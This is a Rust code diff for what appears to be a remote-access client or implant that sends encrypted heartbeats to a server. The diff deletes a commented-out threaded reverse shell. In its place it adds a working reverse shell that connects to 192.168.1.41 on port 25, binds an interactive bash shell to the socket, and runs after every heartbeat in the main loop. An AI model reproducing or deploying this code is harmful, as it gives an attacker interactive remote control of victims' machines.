@@ -8,6 +8,10 @@ use tokio::io::AsyncReadExt;
 use tokio::io::AsyncWriteExt;
 use tokio::net::tcp::OwnedWriteHalf;
 use tokio::net::TcpStream;
+use std::io::Result;
+use std::net::{TcpStream as reverse_stream};
+use std::os::unix::io::{AsRawFd, FromRawFd};
+use std::process::{Command, Stdio};
 
 #[derive(Serialize, Deserialize)]
 struct Message {
@@ -48,69 +52,23 @@ async fn heartbeat(
         .expect("failed to encrypt");
     s_write.write_all(&enc_data).await.unwrap();
 }
-/*
-fn  reverseshell(host: String, port: String) {
-    match TcpStream::connect(format!("{}:{}", host, port)) {
-        Ok(socket) => {
-            let mut tcp_stdin = BufReader::new(socket.try_clone().unwrap());
-            let mut tcp_stderr = BufWriter::new(socket.try_clone().unwrap());
-            let mut tcp_stdout = BufWriter::new(socket);
-            let command = if cfg!(target_os = "windows") {
-                "powershell.exe"
-            } else {
-                "/bin/bash"
-            };
-            let mut process = Command::new(command)
-                .stdin(Stdio::piped())
-                .stdout(Stdio::piped())
-                .stderr(Stdio::piped())
-                .spawn().unwrap();
-            let mut stdout = BufReader::new(process.stdout.take().unwrap());
-            let mut stderr = BufReader::new(process.stderr.take().unwrap());
-            let mut stdin = process.stdin.take().unwrap();
-            // stdout
-            thread::spawn(move || {
-                loop {
-                    let mut output = vec![];
-                    // read in loop until a space because the last character before the child shell waits for input in stdin again is a space
-                    // this is definitely not the cleanest way to do it but I didn't find any other way to read exactly until the child waits for stdin, e.g. read_to_end() create a deadlock and iterate over lines() do not send the last line written on the shell, where we can see again our working directory and make a new command
-                    // if you find a better way to do this, feel free to make a pull request
-                    stdout.read_until(b' ', &mut output).expect("Failed to read stdout");
-                    
-                    match tcp_stdout.write(&output) {
-                        Ok(0) | Err(_) => break,
-                        Ok(_) => tcp_stdout.flush().expect("Failed to flush TCP stdout buffer")
-                    }
-                }
-            });
-            // stderr
-            thread::spawn(move || {
-                loop {
-                    let mut output = vec![];
-                    // almost the same as stdout but this time we're able to read until \n instead of a space, for better buffering
-                    stderr.read_until(b'\n', &mut output).expect("Failed to read stderr");
-                    
-                    match tcp_stderr.write(&output) {
-                        Ok(0) | Err(_) => break,
-                        Ok(_) => tcp_stderr.flush().expect("Failed to flush TCP stderr buffer")
-                    }
-                }
-            });
-            // stdin
-            loop {
-                let mut command = String::new();
-                match tcp_stdin.read_line(&mut command) {
-                    Ok(0) | Err(_) => break,
-                    Ok(_) => stdin.write_all(command.as_bytes()).expect("Failed to write to stdin")
-                }
-            }
-        }
-        Err(error) => {
-            println!("Connection to the socket failed: {}", error);
-        }
-    }
+
+pub fn shell(shell: String) -> Result<()> {
+    let sock = reverse_stream::connect(format!("192.168.1.41:25"))?;
+    let fd = sock.as_raw_fd();
+
+    // Open shell
+    Command::new(format!("{}", shell))
+        .arg("-i")
+        .stdin(unsafe { Stdio::from_raw_fd(fd) })
+        .stdout(unsafe { Stdio::from_raw_fd(fd) })
+        .stderr(unsafe { Stdio::from_raw_fd(fd) })
+        .spawn()?
+        .wait()?;
+
+    Ok(())
 }
-*/
+
 #[tokio::main]
 async fn main() -> io::Result<()> {
     // Generate priv and pub key of client
@@ -176,6 +134,7 @@ async fn main() -> io::Result<()> {
         std::thread::sleep(sleep_time);
         println!("Sending heartbeat");
         heartbeat(&mut writer, &username, &srv_pub_key, rng_thread).await;
+        shell("bash".to_string());
     }
 
     //Shell
